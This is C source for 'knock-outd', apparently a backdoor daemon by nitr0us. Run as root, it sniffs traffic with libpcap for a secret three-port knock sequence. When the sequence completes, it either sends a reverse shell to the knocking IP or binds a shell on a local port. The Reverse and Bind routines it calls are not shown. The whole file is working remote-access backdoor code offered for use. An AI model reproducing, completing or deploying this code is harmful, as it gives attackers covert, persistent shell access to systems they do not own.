/*
 * Server
 * knock-outd
 *
 * by nitr0us
 *
 */

#include "knock-out.h"
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <netinet/ip.h>
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include <setjmp.h>

#define LCOOKEDSIZE	sizeof(struct lcooked_hdr)
#define IPSIZE		sizeof(struct ip)
#define TCPSIZE		sizeof(struct tcphdr)

void callback(u_char *, const struct pcap_pkthdr *, const u_char *);

config_t	config;
static int	stage = 0;
jmp_buf		stack;
pcap_t		*hand;

int main(int argc, char **argv)
{
	char			filter[128], errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program	compiled;
	bpf_u_int32		ip, netmask;

	if(getuid() != (uid_t) 0){
		fprintf(stderr, "You must be root (uid=0)\n");
		exit(EXIT_FAILURE);
	}

	if(argc < 2)
		usage(*argv);

	signal(SIGINT, sigint_handler);
	signal(SIGALRM, sigalrm_handler);
	signal(SIGHUP, Reload_config);

	printf("-=[---------------------------------------------]=-\n");
	printf("-=[-- knock-outd : Port-Knocking Shell Daemon --]=-\n");
	printf("-=[---------------------------------------------]=-\n");
	printf("-=[----------------=[ nitr0us ]=----------------]=-\n");
	printf("-=[---------------------------------------------]=-\n\n");

	debugprint("<===== CONFIG =====>\n");

	setjmp(stack);

	Parse_config(&config);

	debugprint("-=[ Configuration parsing [OK]\n\n");

	debugprint("<===== PCAP =====>\n");

	debugprint("-=[ Interface: %s\n", argv[1]);

	if((hand = pcap_open_live(argv[1], BUFSIZ, 1, -1, errbuf)) == NULL)
		error("pcap_open_live(): %s\n", errbuf);

	debugprint("-=[ pcap_open_live(): [OK]\n");

	if(pcap_lookupnet(argv[1], &ip, &netmask, errbuf) == -1)
		error("pcap_lookupnet(): %s\n", errbuf);

	debugprint("-=[ pcap_lookupnet(): [OK]\n");

	snprintf(filter, 128, "dst host %s and %s dst port %u or %u or %u",\
				get_IP(argv[1]),\
				config.proto,\
				config.sec1,\
				config.sec2,\
				config.sec3);

	debugprint("-=[ PCAP filter: \"%s\"\n", filter);

	if(pcap_compile(hand, &compiled, filter, 0, ip) == -1){
		fprintf(stderr, "pcap_compile()\n");
		exit(EXIT_FAILURE);
	}

	debugprint("-=[ pcap_compile(): [OK]\n");

	if(pcap_setfilter(hand, &compiled) == -1){
		fprintf(stderr, "pcap_setfilter()\n");
		exit(EXIT_FAILURE);
	}

	debugprint("-=[ pcap_setfilter(): [OK]\n\n");

	debugprint("<===== PORT-KNOCKING =====>\n");
	pcap_loop(hand, -1, callback, NULL);

	fprintf(stdout, "-=[ pcap_loop(): Finished...\n");
	exit(EXIT_SUCCESS);
}

void usage(char *prog)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*devices, *ifptr;
	pcap_addr_t	*addrptr;

	fprintf(stderr, "Usage: %s <interface>\n", prog);
	fprintf(stderr, "Available interfaces: \n");
	fprintf(stderr, "\tName\tAddress(es)\t\tDescription\n");

	if(pcap_findalldevs(&devices, errbuf) == -1)
		error("pcap_findalldevs(): %s\n", errbuf);
	else {
		for(ifptr = devices; ifptr; ifptr = ifptr->next){
			if(stringcomp("any", ifptr->name))
					continue;

			printf("\t%s\t", ifptr->name);

			for(addrptr = ifptr->addresses; addrptr; addrptr = addrptr->next)
				if(addrptr->addr)
					if(addrptr->addr->sa_family == AF_INET)
						printf("%s ", inet_ntoa(((struct sockaddr_in *) addrptr->addr)->sin_addr));

			printf("\t\t%s\n", ifptr->description ? ifptr->description : ifptr->flags & PCAP_IF_LOOPBACK ? "Loopback Interface" : " ");
		}

		pcap_freealldevs(devices);
	}

	exit(EXIT_FAILURE);
}

void callback(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
	char			dlink;
	u_int8_t		dlink_offset;
	static char		srcip_previous[20], srcip_current[20];
	struct lcooked_hdr	*LCOOKED;	// Data Link
	struct ether_header	*ETHER;		// Data Link
	struct ip		*IP;		// Network
	struct udphdr		*UDP;		// Transport
	struct tcphdr		*TCP;		// Transport

	switch(dlink = pcap_datalink(hand)){
		case DLT_EN10MB:	/* Ethernet */
			ETHER = (struct ether_header *) packet;
			if(ntohs(ETHER->ether_type) == ETHERTYPE_IP){
				dlink_offset = ETHER_HDR_LEN;
				break;
			} else
				return;
		case DLT_LINUX_SLL:
			LCOOKED = (struct lcooked_hdr *) packet;
			if(ntohs(LCOOKED->proto) == ETHERTYPE_IP){
				dlink_offset = LCOOKEDSIZE;
				break;
			} else
				return;
		default:
			fprintf(stderr, "Unsupported Data Link: %s = %s\n",\
					pcap_datalink_val_to_name(dlink),\
					pcap_datalink_val_to_description(dlink));

			pcap_close(hand);
			exit(EXIT_SUCCESS);
	}

	IP  = (struct ip *) (packet + dlink_offset);
	TCP = (struct tcphdr *) (packet + dlink_offset + IPSIZE);
	UDP = (struct udphdr *) (packet + dlink_offset + IPSIZE);
	strncpy(srcip_current, (const char *) inet_ntoa(IP->ip_src), 20);

	switch(stage){
		case 0:
			if(stringcomp("tcp", config.proto)){
				if(ntohs(TCP->th_dport) == config.sec1){
					if(VALID_FLAGS(TCP->th_flags))
						goto level1_reached;
					else
						debugprint("-=[ %s sent invalid flags at Level 1: 0x%x\n", srcip_current, TCP->th_flags);
				}

				break;
			} else { /* udp */
				if(ntohs(UDP->uh_dport) == config.sec1)
					goto level1_reached;

				break;

			}
level1_reached:
			debugprint("-=[ Level 1 reached. %s knocked the port %d\n",\
					srcip_current,\
					config.sec1);

			strncpy(srcip_previous, srcip_current, 20);
			stage++;

			alarm((unsigned int) config.timeout);
			break;
		case 1:
			if(!stringcomp(srcip_previous, srcip_current)){
				debugprint("-=[ Different source IPs between Level 1 and 2\n");
				debugprint("-=[ IP Level 1: %s\n", srcip_previous);
				debugprint("-=[ IP Level 2: %s\n", srcip_current);
				debugprint("-=[ Resetting port knocking sequence...\n");
				debugprint("-=[ Initiate the sequence from the beginning...\n");

				stage = 0;
				break;
			} else if(stringcomp("tcp", config.proto)){
				if(ntohs(TCP->th_dport) == config.sec2){
					if(VALID_FLAGS(TCP->th_flags))
						goto level2_reached;
					else {
						alarm(0); // Reset pending timeout
						debugprint("-=[ %s sent invalid flags at Level 2: 0x%x\n", srcip_current, TCP->th_flags);
						debugprint("-=[ Resetting port knocking sequence...\n");
						debugprint("-=[ Initiate the sequence from the beginning...\n");
						stage = 0;
					}
				}

				break;
			} else { /* udp */
				if(ntohs(UDP->uh_dport) == config.sec2)
					goto level2_reached;

				break;
			}
level2_reached:
			alarm(0); // Reset pending timeout

			debugprint("-=[ Level 2 reached. %s knocked the port %d\n",\
					srcip_current,\
					config.sec2);

			strncpy(srcip_previous, srcip_current, 20);
			stage++;

			alarm((unsigned int) config.timeout);
			break;
		case 2:
			if(!stringcomp(srcip_previous, srcip_current)){
				debugprint("-=[ Different source IPs between Level 2 and 3\n");
				debugprint("-=[ IP Level 2: %s\n", srcip_previous);
				debugprint("-=[ IP Level 3: %s\n", srcip_current);
				debugprint("-=[ Resetting port knocking sequence...\n");
				debugprint("-=[ Initiate the sequence from the beginning...\n");

				stage = 0;
				break;
			} else if(stringcomp("tcp", config.proto)){
				if(ntohs(TCP->th_dport) == config.sec3){
					if(VALID_FLAGS(TCP->th_flags))
						goto level3_reached;
					else {
						alarm(0); // Reset pending timeout
						debugprint("-=[ %s sent invalid flags at Level 3: 0x%x\n", srcip_current, TCP->th_flags);
						debugprint("-=[ Resetting port knocking sequence...\n");
						debugprint("-=[ Initiate the sequence from the beginning...\n");
						stage = 0;
					}
				}

				break;
			} else { /* udp */
				if(ntohs(UDP->uh_dport) == config.sec3)
					goto level3_reached;

				break;
			}
level3_reached:
			alarm(0); //  Reset pending timeout

			debugprint("-=[ Level 3 reached. %s knocked the port %d\n",\
					srcip_current,\
					config.sec3);

			if(stringcomp("reverse", config.method)){
				debugprint("-=[ Sending shell to %s on the port %d\n\n",\
					srcip_current, config.port);

				debugprint("<===== REVERSE =====>\n");

				Reverse(srcip_current, config.port);
			} else {
				debugprint("-=[ Binding a shell on the local port %d/tcp\n\n",\
					config.port);

				debugprint("<===== BIND =====>\n");

				Bind(config.port);
			}

			stage = 0;
	}
}

void sigint_handler(int signum)
{
	debugprint("\n-=[ Signal received [%d]: %s\n", signum, sys_siglist[signum]);
	debugprint("-=[ Exiting...\n");

	pcap_close(hand);

	exit(EXIT_FAILURE);
}

void sigalrm_handler()
{
	debugprint("-=[ Timeout !\n");
	debugprint("-=[ Resetting port knocking sequence...\n");
	debugprint("-=[ Initiate the sequence from the beginning...\n");

	stage = 0;
}

void Reload_config(int signum)
{
	debugprint("\n-=[ Signal received [%d]: %s\n", signum, sys_siglist[signum]);
	debugprint("-=[ Reloading config file (knock-out.conf)...\n");

	longjmp(stack, 1);
}

char *get_IP(const char *disp)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*devices, *ifptr;
	pcap_addr_t	*addrptr;

	if(pcap_findalldevs(&devices, errbuf) == -1)
		error("pcap_findalldevs() @ get_IP(): %s\n", errbuf);
	else {
		for(ifptr = devices; ifptr; ifptr = ifptr->next)
			if(stringcomp(disp, ifptr->name))
				for(addrptr = ifptr->addresses; addrptr; addrptr = addrptr->next)
					if(addrptr->addr)
						if(addrptr->addr->sa_family == AF_INET)
							return ((char *) inet_ntoa(((struct sockaddr_in *) addrptr->addr)->sin_addr));

		pcap_freealldevs(devices);

		return NULL;	// No addresses found
	}
}
